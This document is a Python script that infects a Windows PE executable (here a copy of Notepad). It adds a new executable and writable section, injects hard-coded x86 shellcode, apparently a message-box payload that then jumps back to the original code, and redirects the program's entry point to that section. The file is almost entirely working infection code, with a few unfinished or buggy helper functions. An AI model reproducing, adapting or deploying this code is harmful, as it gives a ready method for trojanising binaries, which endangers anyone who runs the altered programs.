from importlib.metadata import entry_points
import pefile
import pwn
import os
import mmap

payload = bytes(b"\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9"
                b"\x64\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x46\x08"
                b"\x8b\x7e\x20\x8b\x36\x38\x4f\x18\x75\xf3\x59\x01\xd1"
                b"\xff\xe1\x60\x8b\x6c\x24\x24\x8b\x45\x3c\x8b\x54\x28"
                b"\x78\x01\xea\x8b\x4a\x18\x8b\x5a\x20\x01\xeb\xe3\x34"
                b"\x49\x8b\x34\x8b\x01\xee\x31\xff\x31\xc0\xfc\xac\x84"
                b"\xc0\x74\x07\xc1\xcf\x0d\x01\xc7\xeb\xf4\x3b\x7c\x24"
                b"\x28\x75\xe1\x8b\x5a\x24\x01\xeb\x66\x8b\x0c\x4b\x8b"
                b"\x5a\x1c\x01\xeb\x8b\x04\x8b\x01\xe8\x89\x44\x24\x1c"
                b"\x61\xc3\xb2\x08\x29\xd4\x89\xe5\x89\xc2\x68\x8e\x4e"
                b"\x0e\xec\x52\xe8\x9f\xff\xff\xff\x89\x45\x04\xbb\x7e"
                b"\xd8\xe2\x73\x87\x1c\x24\x52\xe8\x8e\xff\xff\xff\x89"
                b"\x45\x08\x68\x6c\x6c\x20\x41\x68\x33\x32\x2e\x64\x68"
                b"\x75\x73\x65\x72\x30\xdb\x88\x5c\x24\x0a\x89\xe6\x56"
                b"\xff\x55\x04\x89\xc2\x50\xbb\xa8\xa2\x4d\xbc\x87\x1c"
                b"\x24\x52\xe8\x5f\xff\xff\xff\x68\x69\x74\x79\x58\x68"
                b"\x65\x63\x75\x72\x68\x6b\x49\x6e\x53\x68\x42\x72\x65"
                b"\x61\x31\xdb\x88\x5c\x24\x0f\x89\xe3\x68\x65\x58\x20"
                b"\x20\x68\x20\x63\x6f\x64\x68\x6e\x20\x75\x72\x68\x27"
                b"\x6d\x20\x69\x68\x6f\x2c\x20\x49\x68\x48\x65\x6c\x6c"
                b"\x31\xc9\x88\x4c\x24\x15\x89\xe1\x31\xd2\x6a\x40\x53"
                b"\x51\x52\xff\xd0\xB8\xF0\x50\x45\x00\xFF\xD0")

# Path to pe file
path = 'C:\\Users\\ADmin\\Desktop\\TestPlace\\NOTEPAD.exe'
pe = pefile.PE(path)

file_alignment = pe.OPTIONAL_HEADER.FileAlignment
section_alignment = pe.OPTIONAL_HEADER.SectionAlignment

# Get the info section about number of sections and last section


def get_info_section(pe):
    # Get some info about section
    number_of_sections = pe.FILE_HEADER.NumberOfSections
    last_section = number_of_sections - 1
    return number_of_sections, last_section


def calc_entry_point_va(pe):
    # Get entry_point and image_base of pe file
    entry_point = pe.OPTIONAL_HEADER.AddressOfEntryPoint
    image_base = pe.OPTIONAL_HEADER.ImageBase

    # Calc the entry_point_virtual_address = entry_point + image_based
    entry_point_va = entry_point + image_base

    return entry_point_va

# Align function


def align(value, alignment):
    return ((value+alignment-1) / alignment) * alignment

# Get the virtual_offset and rawoffset


def get_virtual_raw_size(pe):
    raw_size = align(0x1000, file_alignment)
    virtual_size = align(0x1000, section_alignment)
    return int(raw_size), int(virtual_size)


def get_virtual_raw_offset(pe):
    virtual_offset = align(pe.sections[last_section].VirtualAddress +
                           pe.sections[last_section].Misc_VirtualSize, file_alignment)
    raw_offset = align(pe.sections[last_section].PointerToRawData +
                       pe.sections[last_section].SizeOfRawData, section_alignment)
    return int(virtual_offset), int(raw_offset)


# Offset = RA - Section RA = VA - Section VA


def calc_X_Y_Z(raw_address, section_raw_address, section_virtual_address):
    return raw_address - section_raw_address + section_virtual_address

# Calc the rel_virtual_address


def calc_rel_va(old_entry_point, new_entry_point):
    return old_entry_point - 0x5 - (new_entry_point + 0x14)

# Create payload


def create_payload(x, y, z, new_entry_point, rel_virtual_address):
    payload = ""
    first_payload = "\x6A\x00"
    second_payload = "\x68"
    return


try:
    number_of_sections, last_section = get_info_section(pe)
    # New section offset
    new_section_offset = (pe.sections[last_section].get_file_offset() + 40)

    # STEP 0x01 - Resize the Executable
    # Note: I added some more space to avoid error
    print("[*] STEP 1 - Resize the Executable")

    original_size = os.path.getsize(path)
    print("\t[+] Original Size = %d" % original_size)
    fd = open(path, 'a+b')
    map = mmap.mmap(fd.fileno(), 0, access=mmap.ACCESS_WRITE)
    map.resize(original_size + 0x2000)
    map.close()
    fd.close()

    print("\t[+] New Size = %d bytes\n" % os.path.getsize(path))

    print("\n[*] STEP 2 - Add the New Section Header")
    print("\nnew section_offset: ", hex(new_section_offset))

    # Get the header section of pe file
    # get the va_offset, raw_offset
    virtual_offset, raw_offset = get_virtual_raw_offset(pe)
    print("\nrsrc virtual address offset: ", hex(virtual_offset))
    print("rsrc raw address offset: ", hex(raw_offset))

    # get virtual_size, raw_size
    virtual_size, raw_size = get_virtual_raw_size(pe)
    print("\nvirtual address size: ", hex(virtual_size))
    print("raw address size: ", hex(raw_size))

    # Calc the entry_point
    entry_point_va = calc_entry_point_va(pe)
    print('\nEntry point va: ', hex(entry_point_va))

    # CODE | EXECUTE | READ | WRITE
    characteristics = 0xE0000020
    # Section name must be equal to 8 bytes
    name = ".axc" + (4 * '\x00')

    # Create the section
    # Set the name
    pe.set_bytes_at_offset(new_section_offset, name)
    print("\tSection name: ", name)

    # Set the virtual size
    pe.set_dword_at_offset(new_section_offset + 8, virtual_size)
    print("\tVirtual size: ", hex(virtual_size))

    # Set the virtual offset
    pe.set_dword_at_offset(new_section_offset + 12, virtual_offset)
    print("\tVirtual offset: ", hex(virtual_offset))

    # Set the raw size
    pe.set_dword_at_offset(new_section_offset + 16, raw_size)
    print("\tRaw size: ", hex(raw_size))

    # Set the raw offset
    pe.set_dword_at_offset(new_section_offset + 20, raw_offset)
    print("\tRaw offset: ", hex(raw_offset))

    # Set the following fields to zero
    pe.set_bytes_at_offset(new_section_offset + 24, (12 * b'\x00'))

    # Set the characteristics
    pe.set_dword_at_offset(new_section_offset + 36, characteristics)
    print("\tCharacteristics = ", hex(characteristics))

    print("\n[*] STEP 3 - Modify the Main Headers")
    pe.FILE_HEADER.NumberOfSections += 1
    print("\tNew number of sections: ", pe.FILE_HEADER.NumberOfSections)
    pe.OPTIONAL_HEADER.SizeOfImage = virtual_offset + virtual_size
    print("\tNew Size of image: ", pe.OPTIONAL_HEADER.SizeOfImage)

    pe.write(path)

    pe = pefile.PE(path)
    for section in pe.sections:
        print(section.Name)
        
    number_of_section = pe.FILE_HEADER.NumberOfSections
    last_section = number_of_section - 1
    
    print(number_of_section)

    new_ep = pe.sections[last_section].VirtualAddress
    print("\tNew Entry Point = %s" %
          hex(pe.sections[last_section].VirtualAddress))
    oep = pe.OPTIONAL_HEADER.AddressOfEntryPoint

    print("\tOriginal Entry Point = %s\n" %
          hex(pe.OPTIONAL_HEADER.AddressOfEntryPoint))
    pe.OPTIONAL_HEADER.AddressOfEntryPoint = new_ep

    print("\n[+]STEP 0x04 - Inject the Shellcode in the New Section")
    raw_offset = pe.sections[last_section].PointerToRawData
    pe.set_bytes_at_offset(raw_offset, payload)
    pe.write(path)

finally:
    print("\nDone")